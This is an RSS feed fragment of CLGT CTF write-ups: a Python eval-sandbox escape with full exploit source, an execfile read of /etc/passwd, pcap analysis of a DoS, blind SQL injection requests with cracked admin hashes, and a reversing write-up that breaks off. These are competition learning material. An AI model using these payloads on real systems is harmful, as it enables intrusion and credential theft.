<p>The python program consists of two parts:</p>

<ul>
  <li>First part is the Detangle class which basically make a “sandbox” environment:</li>
</ul>

<ol>
  <li>You can not import anything.</li>
  <li>You can neither use “open” nor “file” command.</li>
  <li>It prints some nice debug information about what python command is executed and their arguments.</li>
</ol>

<ul>
  <li>Second part allows you to input 3 params: num1, num2 and operator. There are two regular expressions to check your input:</li>
</ul>

<pre class="brush: plain; title: ; notranslate" title="">num_pattern = re.compile(r'^[d]{0,4}$')
operator_pattern = re.compile(r'^[W]+$')
...
if not num_pattern.match(num1) or not num_pattern.match(num2):
    raise SystemExit('Number rejected')
if not operator_pattern.match(operator) or len(operator) &gt; 1900:
    raise SystemExit('Operator rejected')
</pre>

<ol>
  <li>num1, num2 should only be number, 4 digits at most.</li>
  <li>operator should not contain any alphanumeric characters and its length must be at most 1900.</li>
</ol>

<p>These input will be fed into some eval command as follow:</p>

<pre class="brush: plain; title: ; notranslate" title="">operator = eval(operator) if "'" in operator else operator
print(eval(num1 + operator + num2))
</pre>

<p>For example, you can input “1″ , “2″ , “+”. The program will return “3″, simple as that.</p>

<p>Obviously, if someone tells you to exploit this program, first is to look at “eval” (i.e. “evil”) and try to exploit that. But it’s a difficult task because you can’t bypass the two regular expressions and input any python code, recall that you can only input number or non-alphanumberic character.</p>

<p>I tried several attempts and failed including some silly: trying to write a valid python code using unicode character, trying to overflow eval, trying to exploit Detangle, find a 0-day/1-day of re.match, ..<br />
But failures teach you some lessons. I noticed that “operator” is eval-ed twice. That means after the first eval, we may be able to convert some non-alphanumberic character into python code and get it executed on the next one.</p>

<p>I started with this gadget: s = <code>"(''=='')+(''=='')"</code>(inside are two single quotes). Run eval(s) in a python terminal will return you number “2″. Using this gadget/similar kind we typically can create any number. Progress: 25% !</p>

<p>Now what about character ? It turned out that I can use backstick : ` ` as repr() which can give me some string that contains alpha-character, such as : <code>`(''=='')`</code> =&gt; “True”, <code>`(''!='')`</code> =&gt; “False”, moreover I can access each single character using square bracket : <code>`(''=='')`[1]</code> =&gt; ‘r’, or even better <code>`'xaa'`[3]</code> =&gt; ‘a’. We now can create any of these:** ‘abcdefxTruFls’**. Progress: 50% !</p>

<p>I stopped looking at gadget, and started looking at how to bypass the Detangle class. It’s not hard as it look, though we can’t use “open” or “file” to open a file, can’t import anything, we can still use the built-in <strong>“execfile”</strong>. It does not allow us to run abitrary command but we can leak some info about the content of a file like this:</p>

<blockquote>
  <blockquote>
    <blockquote>
      <blockquote>
        <p>execfile(“/etc/passwd”)<br />
Traceback (most recent call last):<br />
File “”, line 1, in<br />
File “/etc/passwd”, line 1<br />
root:x:0:0:root:/root:/bin/bash  </p>
      </blockquote>
    </blockquote>
  </blockquote>
  <p>SyntaxError: invalid syntax</p>
</blockquote>

<p>Progress: 75% !!!!! ** so excited **</p>

<p>I need to read the file ‘key’ which makes the payload: “<strong>+execfile(‘key’)+</strong>“. As you can see, It contains “k”,”y”,”i” that is not in my “magic” list. Luckily the force is with me, 5 minutes after seeing this problem, I come up with this awesome gadget: <code>"%c"%(107)</code> =&gt; “k”. Any character can be generated using this gadget, however producing the number 107 can consume a lot of characters if done naively.</p>

<p>The last thing is to make the payload as short as possible because the operator length is limited at 1900. Putting everything together, I am able to produce a 1650-bytes payload, far smaller than the limit! Now see how it work:</p>

<blockquote>
  <p>python exploit.py | nc ctf.fluxfingers.net 2060<br />
…<br />
Traceback (most recent call last):<br />
File “./sandbox.py”, line 77, in<br />
print(eval(num1 + operator + num2))<br />
File “./sandbox.py”, line 45, in __call__<br />
result = self.orig(*args, *<em>kwargs)<br />
File “”, line 1, in<br />
File “./sandbox.py”, line 45, in __call__<br />
result = self.orig(*args, *</em>kwargs)<br />
File “key”, line 1, in<br />
dafuq_how_did_you_solve_this_nonalpha_thingy<br />
NameError: name ‘dafuq_how_did_you_solve_this_nonalpha_thingy’ is not defined</p>
</blockquote>

<p>Mission accomplished ! Beer time =]</p>

<p><strong>exploit.py</strong> source code:</p>

<pre class="brush: plain; title: ; notranslate" title="">def makenumsmall(d):
	gadget = "(''=='')"
	rs = gadget

	if (d==0): return rs+"-"+rs
	if (d==1): return rs+"*"+rs

	for i in range(1,d): rs += "+(''=='')"
	return rs

def makenum(d):
	if (d&lt;5): return makenumsmall(d)
	a = bin(d)[2:]
	index = len(a) - 1
	s = ""
	for c in a:
		if c == '1':
			s+= "("+makenumsmall(1)+"&lt;&lt;"+makenumsmall(index)+")+"
		index-=1
	return s[0:-1]

def makechar(line):
	return "('%'+`'"+chr(0xcc)+"'`["+str(makenum(3))+"])["+str(makenum(0))+":"+str(makenum(4))+"]%(" + makenum(line) + ")"

gd = {}

gd['x'] = "`'"+chr(0xcc)+"'`["+makenum(2)+"]"
gd['a'] = "`'"+chr(0xaa)+"'`["+makenum(3)+"]"
gd['b'] = "`'"+chr(0xbb)+"'`["+makenum(3)+"]"
gd['c'] = "`'"+chr(0xcc)+"'`["+makenum(3)+"]"
gd['d'] = "`'"+chr(0xdd)+"'`["+makenum(3)+"]"
gd['e'] = "`'"+chr(0xee)+"'`["+makenum(3)+"]"
gd['f'] = "`'"+chr(0xff)+"'`["+makenum(3)+"]"

a = "+execfile('key')+"
solo = [ord(i) for i in a]
#print solo
_sum = ''
import re
for line in solo:
	if chr(line) in gd:
		_gad = gd[chr(line)]
	elif chr(line) == "'":
		_gad = "'\''"
	elif re.match("W",chr(line)):
		_gad = "'"+chr(line)+"'"
	else:
		_gad = makechar(line)
	_sum += "+" + _gad

_sum = _sum[1:]
#print len(_sum)
#print eval(eval(_sum))
print "1n1n"+_sum
</pre>

  ]]></description>
</item>

	<item>
  <title>CSAW CTF 2012</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/01/csaw-2012-ctf.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2012-10-01T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2012/10/01/csaw-2012-ctf.html</guid>
  <description><![CDATA[
     <p>CLGT has just finished CSAW CTF 2012. Solved all challenges and finished 5th. Congrats to CLGT’s junior undergrad members who have done amazing jobs by solving most of the challenges.</p>

<p style="text-align: center">
  <a href="/wp/storage/uploads/2012/10/csaw2012-scoreboard.png"><img class="aligncenter size-full wp-image-1425" title="csaw2012 scoreboard" src="/wp/storage/uploads/2012/10/csaw2012-scoreboard.png" alt="csaw2012 scoreboard" width="462" height="350" /></a>
</p>

  ]]></description>
</item>

	<item>
  <title>Codegate 2012 Quals &#8211; Network 200</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2012/03/01/codegate-2012-quals-network-200.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2012-03-01T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2012/03/01/codegate-2012-quals-network-200.html</guid>
  <description><![CDATA[
     <p><strong>Challenge</strong></p>

<blockquote>
  <p>To whom it may concern to DoS attack.<br />
What is the different between attack and normal traffic?<br />
Attached PCAP file is from suspicious client PC which may be infected.<br />
If you find TOP 4 targeting address, let me know exactly information such as below.<br />
Answer:<br />
COUNTRY_NAME_TOP1(3)COUNTRY_NAME_TOP2(13)COUNTRY_NAME_TOP3(2)COUNTRY_NAME_TOP4(5)_1.1.1.1_2.2.2.2_3.3.3.3_4.4.4.4 </p>
</blockquote>

<p><a href="http://repo.shell-storm.org/CTF/CodeGate-2012/Network200/A565CF2670A7D77603136B69BF93EA45">http://repo.shell-storm.org/CTF/CodeGate-2012/Network200/A565CF2670A7D77603136B69BF93EA45</a></p>

<p><strong>Summary</strong><br />
Given a pcap file, our task is to find top 4 targeting addresses of a DoS attack. This challenge requires network analysis skill with some experiences of DoS attack.</p>

<p><strong>Solution</strong></p>

<p>We wrote a small python script to generate the statistics of packets:</p>

<pre class="brush: python; title: ; notranslate" title="">from scapy.all import *
import operator
packets = rdpcap("network200")
stats = {}
for packet in packets:
    try:
        dst = packet.payload.dst
        if dst not in stats: stats[dst] = 0
        stats[dst] += 1
    except:
        pass
for k,v in sorted(stats.iteritems(), key=operator.itemgetter(1))[::-1]:
    print k,v
</pre>

<p>Here’s a part of output:</p>

<blockquote>
  <p>111.221.70.11 52620<br />
1.2.3.4 12670<br />
109.123.118.42 2960<br />
174.35.40.44 637<br />
220.73.139.203 452<br />
123.214.170.56 375<br />
199.7.48.190 311<br />
220.73.139.201 280<br />
8.8.8.8 248<br />
74.125.71.94 208<br />
208.46.163.42 186<br />
175.158.10.55 146<br />
174.35.40.43 145<br />
74.125.71.120 120<br />
74.125.71.104 116<br />
69.171.234.16 103<br />
66.150.14.48 99<br />
61.110.213.19 94<br />
184.28.147.55 84<br />
174.35.40.45 82<br />
110.45.229.135 82<br />
199.59.149.232 79<br />
61.106.27.72 77<br />
184.169.76.33 68<br />
74.125.71.157 62<br />
211.174.53.236 56<br />
174.35.40.6 55<br />
208.94.0.38 54<br />
… </p>
</blockquote>

<p>Then we checked one by one from the top of our list using WireShark:</p>

<ul>
  <li>111.221.70.11 is obviously under SYN flood attack.</li>
  <li>109.123.118.42 is flooded by HTTP GET requests.</li>
  <li>199.7.48.190 is under RUDY attack (POST requests with very large Content-Length).</li>
  <li>66.150.14.48 has some abnormal HTTP Requests.</li>
</ul>

<p>Using ip2location.com, we got the country names in respective order:</p>

<ul>
  <li>Singapore</li>
  <li>United Kingdom</li>
  <li>United States</li>
  <li>United States</li>
</ul>

<p>FLAG: <strong>none_111.221.70.11_109.123.118.42_199.7.48.190_66.150.14.48</strong></p>

  ]]></description>
</item>

	<item>
  <title>CodeGate 2012 Quals &#8211; Network 400</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2012/03/01/codegate-2012-quals-network-400.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2012-03-01T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2012/03/01/codegate-2012-quals-network-400.html</guid>
  <description><![CDATA[
     <p><strong>Challenge</strong></p>

<blockquote>
  <p>Because of vulnerability of site in Company A, database which contains user’s information was leaked. The file is dumped packet at the moment of attacking.<br />
Find the administrator’s account information which was leaked from the site.<br />
For reference, some parts of the packet was blind to XXXX.</p>

  <table>
    <tbody>
      <tr>
        <td>Answer : strupr(md5(database_name</td>
        <td>table_name</td>
        <td>decode(password_of_admin)))</td>
      </tr>
      <tr>
        <td>(‘</td>
        <td>’is just a character)</td>
        <td> </td>
      </tr>
    </tbody>
  </table>
</blockquote>

<p><a href="http://repo.shell-storm.org/CTF/CodeGate-2012/Network400/80924D4296FCBE81EA5F09CF60542AE7">http://repo.shell-storm.org/CTF/CodeGate-2012/Network400/80924D4296FCBE81EA5F09CF60542AE7</a></p>

<p><strong>Summary</strong></p>

<p>Given a pcap file (again) captured from an attack, we need to find information about database name, table name, administrator’s password in plaintext.<br />
This challenge requires basic network analysis skill, some knowledge of Blind SQL Injection and password recovery tools.</p>

<p><strong>Solution</strong></p>

<p>Browsing the pcap file using wireshark, this is obviously a Blind SQL Injection attack.</p>

<pre class="brush: plain; gutter: false; highlight: [1,15,19,33]; title: ; notranslate" title="">GET /sc/id_check.php?name=music%27%20AND%20%27Ohavy%27=%27Ohavyy HTTP/1.1
Accept-Encoding: identity
Accept-Language: en-us,en;q=0.5
Host: www.cdgate.xxx
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.15)
Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Connection: close

HTTP/1.1 200 OK
Date: Wed, 22 Feb 2012 09:01:54 GMT
Server: Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.1 with Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g
X-Powered-By: PHP/5.2.6-2ubuntu4.1
Vary: Accept-Encoding
Content-Length: 0
Connection: close
Content-Type: text/html

GET /sc/id_check.php?name=music%27%20AND%20%27Ohavy%27=%27Ohavy HTTP/1.1
Accept-Encoding: identity
Accept-Language: en-us,en;q=0.5
Host: www.cdgate.xxx
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.15)
Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Connection: close

HTTP/1.1 200 OK
Date: Wed, 22 Feb 2012 09:01:54 GMT
Server: Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.1 with Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g
X-Powered-By: PHP/5.2.6-2ubuntu4.1
Vary: Accept-Encoding
Content-Length: 4
Connection: close
Content-Type: text/html
</pre>

<p>Some first requests are just for checking the responses of server to some random injected queries. We can easily notice that if the expressions in injected queries return False, HTTP response will have <strong>“Content-Length: 0”</strong>, otherwise the expressions return True. Another thing is that all the attacking queries had the same pattern of <strong>… [EXPRESSION] &gt; [VALUE] …</strong> As the operators were all ‘&gt;’, for each [EXPRESSION] we only need to catch the last [VALUE] of ‘False’ responses.</p>

<p>We created a python script to parse this pcap file:</p>

<pre class="brush: python; title: ; notranslate" title="">import sys
from scapy.all import *
import urllib, string

packets = rdpcap("network400")
len_packets = len(packets)
l1 = []
l2 = []
i = 0
while i &lt; len_packets:
    if 'Raw' in packets[i] and packets[i].payload.dst == '192.168.1.41':
        l1.append(urllib.unquote(str(packets[i]['Raw']).split("r")[0]))
        while True:
            i+=1
            if 'Raw' in packets[i]:
                if packets[i].payload.dst == '192.168.1.8':
                    content = str(packets[i]['Raw'])
                    if 'Content-Length: 0' in content:
                        l2.append(False)
                    else:
                        l2.append(True)
                    break
    i+=1
for i in range(len(l1)):
    print l1[i]
    print l2[i]
</pre>

<p>Here’s a part of the output:</p>

<blockquote>
  <p>…<br />
GET /sc/id_check.php?name=music’ AND CONNECTION_ID()=CONNECTION_ID() AND ‘YOxWw’=’YOxWw HTTP/1.1<br />
True<br />
GET /sc/id_check.php?name=music’ AND ISNULL(1/0) AND ‘wSwEm’=’wSwEm HTTP/1.1<br />
True<br />
GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT 7 FROM information_schema.TABLES LIMIT 0, 1), 1, 1)) &gt; 51 AND ‘zqAWP’=’zqAWP HTTP/1.1<br />
True<br />
GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT 7 FROM information_schema.TABLES LIMIT 0, 1), 1, 1)) &gt; 54 AND ‘zqAWP’=’zqAWP HTTP/1.1<br />
True<br />
GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT 7 FROM information_schema.TABLES LIMIT 0, 1), 1, 1)) &gt; 56 AND ‘zqAWP’=’zqAWP HTTP/1.1<br />
False<br />
GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT 7 FROM information_schema.TABLES LIMIT 0, 1), 1, 1)) &gt; 55 AND ‘zqAWP’=’zqAWP HTTP/1.1<br />
False<br />
GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT 7 FROM information_schema.TABLES LIMIT 0, 1), 2, 1)) &gt; 51 AND ‘zqAWP’=’zqAWP HTTP/1.1<br />
False<br />
GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT 7 FROM information_schema.TABLES LIMIT 0, 1), 2, 1)) &gt; 48 AND ‘zqAWP’=’zqAWP HTTP/1.1<br />
False<br />
GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT 7 FROM information_schema.TABLES LIMIT 0, 1), 2, 1)) &gt; 1 AND ‘zqAWP’=’zqAWP HTTP/1.1<br />
False<br />
GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR(10000)), CHAR(32)) FROM information_schema.SCHEMATA), 1, 1)) &gt; 51 AND ‘yFdDA’=’yFdDA HTTP/1.1<br />
False<br />
GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR(10000)), CHAR(32)) FROM information_schema.SCHEMATA), 1, 1)) &gt; 48 AND ‘yFdDA’=’yFdDA HTTP/1.1<br />
True<br />
GET /sc/id_check.php?name=music’ AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR(10000)), CHAR(32)) FROM information_schema.SCHEMATA), 1, 1)) &gt; 49 AND ‘yFdDA’=’yFdDA HTTP/1.1<br />
True<br />
…</p>
</blockquote>

<p>We extended the script to print out only the leaked characters</p>

<pre class="brush: python; title: ; notranslate" title="">import sys
from scapy.all import *
import urllib
packets = rdpcap("network400")
len_packets = len(packets)

cur_s = None
last_false_value = None
result = ""
i=0
while i &lt; len_packets:
    if ('Raw' in packets[i]) and (packets[i].payload.dst == '192.168.1.41'):
        query = urllib.unquote(str(packets[i]['Raw']).split("r")[0])
        if "&gt;" in query:
            s,v = query.split("&gt;")
            v=chr(int(v.strip().split(" ")[0]))
            if cur_s != s and last_false_value != None:
                result+= last_false_value
            cur_s = s
        else:
            v = None
        while True:
            i+=1
            if 'Raw' in packets[i]:
                if packets[i].payload.dst == '192.168.1.8':
                    content = str(packets[i]['Raw'])
                    if 'Content-Length: 0' in content:
                        last_false_value = v
                    break

    i+=1
print result
</pre>

<p>The output looks better (but lack of information about queries):</p>

<pre class="brush: plain; gutter: false; highlight: [82,83,84,85,86,87]; title: ; notranslate" title="">2
information_schema
cdgate
17
CHARACTER_SETS
COLLATIONS
COLLATION_CHARACTER_SET_APPLICABILITY
COLUMNS
COLUMN_PRIVILEGES
KEY_COLUMN_USAGE
PROFILING
ROUTINES
SCHEMATA
SCHEMA_PRIVILEGES
STATISTICS
TABLES
TABLE_CONSTRAINTS
TABLE_PRIVILEGES
TRIGGERS
USER_PRIVILEGES
VIEWS
1
member
3
cdgate
6
name
id
email
sex
level
passwd
11
monitor@cdgate.xxx
08b5411f848a2581a41672a759c87380
2
monitor
*1763CA06A6BF4E96A671D674E855043A9C7886B2
f
apple@cdgate.xxx
apple
3
apple
*C5404E97FF933A91C48743E0C4063B2774F052DD
m
music@cdgate.xxx
music
6
music
*DBA29A581E9689455787B273C91D77F03D7FAD5B
m
computer@cdgate.xxx
computer
2
computer
*8E4ADF66627261AC0DE1733F55C7A0B72EC113FB
f
com@cdgate.xxx
com
3
com
*FDDA9468184E298A054803261A4753FF4657E889
f
lyco@cdgate.xxx
lynco
4
*EEFD19E63FA33259154630DE24A2B17772FAC630
*0ECBFBFE8116C7612A537E558FB7BE1293576B78
f
mouse@cdgate.xxx
mouse
4
*87A5750BB01F1E52060CF8EC90FB1344B1D413AA
*6FF638106693EF27772523B0D5C9BFAF4DD292F1
m
root@cdgate.xxx
root
6
root
*300102BEB9E4DABEB8BD60BB9BB6686A6272C787
f
desktop@cdgate.xxx
desktop
1
desktop
*DDD9B83818DB7B634C88AD49396F54BD0DE31677
f
www@cdgate.xxx
4eae35f1b35977a00ebd8086c259d4c9
8
www
*3E8563E916A490A13918AF7385B8FF865C221039
f
notebook@cdgate.xxx
notebook
8
fb5d1b4a2312e239652b13a24ed9a74f
*18DF7FA3EE218ACB28E69AF1D643091052A95887
m
</pre>

<p>By combining outputs of these 2 scripts we could see that database is <strong>cdgate</strong> and table name is <strong>member</strong>. These information were followed by a number of member records, the value for each record were in order of email, id, level, name, password, sex. There was only one user desktop@cdgate.xxx with level=1, the password was hashed hence we let hashcat do the rest:</p>

<pre class="brush: bash; gutter: false; title: ; notranslate" title="">$ echo DDD9B83818DB7B634C88AD49396F54BD0DE31677 &gt; hash
$ ./hashcat-cli64.bin -m300 -a3 --bf-cs-buf=abcdefghijklmnopqrstuvwxyz0123456789 hash outdir
................
Charset...: abcdefghijklmnopqrstuvwxyz0123456789
Length....: 6
Index.....: 0/1 (segment), 2176782336 (words), 0 (bytes)
Recovered.: 0/1 hashes, 0/1 salts
Speed/sec.: - plains, 13.99M words
Progress..: 1360425204/2176782336 (62.50%)
Running...: 00:00:01:37
Estimated.: 00:00:00:58
ddd9b83818db7b634c88ad49396f54bd0de31677:etagcd
All hashes have been recovered
</pre>

<p>Bingo! The password is <strong>etagcd</strong>, it’s time to build the flag:</p>

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">&gt;&gt;&gt; hashlib.md5('cdgate|member|etagcd').hexdigest().upper();
'AB6FCA7FFC88710CFBC37D5DF9A25F3F'
</pre>

  ]]></description>
</item>

	<item>
  <title>CodeGate 2012 Quals bin500 writeup</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2012/02/28/codegate2012-bin500-write-up.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2012-02-28T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2012/02/28/codegate2012-bin500-write-up.html</guid>
  <description><![CDATA[
     <p>Thanks to Deroko and some ARTeam members to play with CLGT. Below is the write up by Deroko posted on <a href="http://www.xchg.info/wiki/index.php?title=CodeGate2012_bin500">http://www.xchg.info/wiki/index.php?title=CodeGate2012_bin500</a></p>

<h3 style="margin-top: 0px;margin-right: 0px;margin-bottom: 0.3em;margin-left: 0px;padding-top: 0.5em;padding-bottom: 0.17em;border-bottom-width: initial;border-bottom-style: none;border-bottom-color: initial;width: auto;font-size: 17px;font-family: sans-serif">
  <span id="CodeGate2012_bin500">CodeGate2012 bin500</span>
</h3>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  Challenge: <strong>Seeing that it is not all. </strong><br /> Link to challenge: <a rel="nofollow" href="http://deroko.phearless.org/codegate2012/bin/bin500.zip">http://deroko.phearless.org/codegate2012/bin/bin500.zip</a>
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  This binary is double ReWolf vm, and python script for modified Olly by Immunity.
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  Script which comes with binary uses <strong>marshal.loads</strong> to load already compiled pyc code which was produced with <strong>marshal.dump</strong>
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  To get .pyc back we need to make some modification to our script:
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  <a style="text-decoration: none;color: #0b0080;background-color: initial" href="http://www.xchg.info/wiki/index.php?title=File:Modifiedscript.png"><img style="vertical-align: middle;margin: 0px;border: initial none initial" src="http://www.xchg.info/wiki/images/1/14/Modifiedscript.png" alt="Modifiedscript.png" width="766" height="300" /></a>
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  Now <strong>C:test.pyc</strong> will have dump of python bytecode.
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  If you look carefully through script, some strings might look like a clue:
</p>

<div style="font-family: sans-serif;font-size: 13px;text-align: left" dir="ltr">
  <div style="line-height: normal;font-family: monospace">
    <pre style="font-family: monospace, 'Courier New';background-color: initial;font: normal normal normal 1em/1.2em monospace;margin-top: 0px;margin-bottom: 0px;vertical-align: top;padding: 0px;border: 0px none white">readMemory
getRegs
EIP
Nice work<span style="color: #339933">,</span> Key1 <span style="color: #339933">:</span>
But<span style="color: #339933">,</span> Find Next Key!
Nice work<span style="color: #339933">,</span> Key2 <span style="color: #339933">:</span>
Input Key <span style="color: #339933">:</span> Key1 <span style="color: #339933">+</span> Key2
<span style="font-weight: bold">Nothing</span> Found <span style="color: #339933">...</span></pre>
  </div>
</div>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  So this script will probably try to read from current EIP some bytes (readMemory + EIP are good hint), and make key out of it. After modifying <strong>test.pyc</strong> to have proper layout:
</p>

<div style="font-family: sans-serif;font-size: 13px;text-align: left" dir="ltr">
  <div style="line-height: normal;font-family: monospace">
    <pre style="font-family: monospace, 'Courier New';background-color: initial;font: normal normal normal 1em/1.2em monospace;margin-top: 0px;margin-bottom: 0px;vertical-align: top;padding: 0px;border: 0px none white"><span style="color: #adadad;font-style: italic">00000000</span>  <span style="color: #0000ff">03</span> f3 0d 0a dc <span style="font-weight: bold">dd</span> e2 4c  <span style="color: #0000ff">63</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">00</span>  |<span style="color: #339933">.......</span>Lc<span style="color: #339933">.......</span>|
<span style="color: #adadad;font-style: italic">00000010</span>  <span style="color: #0000ff">00</span> <span style="color: #0000ff">02</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">40</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">00</span>  <span style="color: #0000ff">00</span> <span style="color: #0000ff">73</span> <span style="color: #0000ff">22</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">00</span> <span style="color: #0000ff">64</span> <span style="color: #0000ff">00</span>  |<span style="color: #339933">.....</span>@<span style="color: #339933">...</span>s<span style="color: #7f007f">"...d.|
00000020  00 64 01 00 6c 00 00 5a  00 00 64 02 00 84 00 00  |.d..l..Z..d.....|</span></pre>
  </div>
</div>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  Which is actually <strong>4 bytes for python signature</strong> + <strong>4 bytes for timestamp</strong> +<strong>marshal.dump()</strong> data we get .pyc file which we can decompile.
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  For sake of this solution, we will use some simple program to dump python byte-code, and one I found here:<a rel="nofollow" href="http://nedbatchelder.com/blog/200804/the_structure_of_pyc_files.html">http://nedbatchelder.com/blog/200804/the_structure_of_pyc_files.html</a>
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  After disassembling binary with this python script we get (I cut not important parts):
</p>

<div style="font-family: sans-serif;font-size: 13px;text-align: left" dir="ltr">
  <div style="line-height: normal;font-family: monospace">
    <pre style="font-family: monospace, 'Courier New';background-color: initial;font: normal normal normal 1em/1.2em monospace;margin-top: 0px;margin-bottom: 0px;vertical-align: top;padding: 0px;border: 0px none white">             <span style="color: #0000ff">15</span> LOAD_ATTR                <span style="color: #0000ff">2</span> <span style="color: #009900;font-weight: bold">(</span>readMemory<span style="color: #009900;font-weight: bold">)</span>
             <span style="color: #0000ff">18</span> LOAD_CONST               <span style="color: #0000ff">1</span> <span style="color: #009900;font-weight: bold">(</span><span style="color: #0000ff">4237456</span><span style="color: #009900;font-weight: bold">)</span>
             <span style="color: #0000ff">21</span> LOAD_CONST               <span style="color: #0000ff">2</span> <span style="color: #009900;font-weight: bold">(</span><span style="color: #0000ff">80</span><span style="color: #009900;font-weight: bold">)</span>
             <span style="color: #0000ff">24</span> CALL_FUNCTION            <span style="color: #0000ff">2</span></pre>
  </div>
</div>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  So from address <strong>40A890</strong> it will read <strong>80</strong> bytes and keep it in internal buffer.
</p>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  Now comes interesting part when it actually gets keys:
</p>

<div style="font-family: sans-serif;font-size: 13px;text-align: left" dir="ltr">
  <div style="line-height: normal;font-family: monospace">
    <pre style="font-family: monospace, 'Courier New';background-color: initial;font: normal normal normal 1em/1.2em monospace;margin-top: 0px;margin-bottom: 0px;vertical-align: top;padding: 0px;border: 0px none white"> <span style="color: #0000ff">19</span>          <span style="color: #0000ff">54</span> LOAD_FAST                <span style="color: #0000ff">4</span> <span style="color: #009900;font-weight: bold">(</span>regs<span style="color: #009900;font-weight: bold">)</span>
             <span style="color: #0000ff">57</span> LOAD_CONST               <span style="color: #0000ff">3</span> <span style="color: #009900;font-weight: bold">(</span><span style="color: #7f007f">'EIP'</span><span style="color: #009900;font-weight: bold">)</span>
             <span style="color: #0000ff">60</span> BINARY_SUBSCR
             <span style="color: #0000ff">61</span> LOAD_CONST               <span style="color: #0000ff">4</span> <span style="color: #009900;font-weight: bold">(</span><span style="color: #0000ff">4273157</span><span style="color: #009900;font-weight: bold">)</span>
             <span style="color: #0000ff">64</span> COMPARE_OP               <span style="color: #0000ff">2</span> <span style="color: #009900;font-weight: bold">(</span>==<span style="color: #009900;font-weight: bold">)</span>
             <span style="color: #0000ff">67</span> POP_JUMP_IF_FALSE      <span style="color: #0000ff">161</span></pre>
  </div>
</div>

<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
  and
</p>

<div style="font-family: sans-serif;font-size: 13px;text-align: left" dir="ltr">
  <div style="line-height: normal;font-family: monospace">
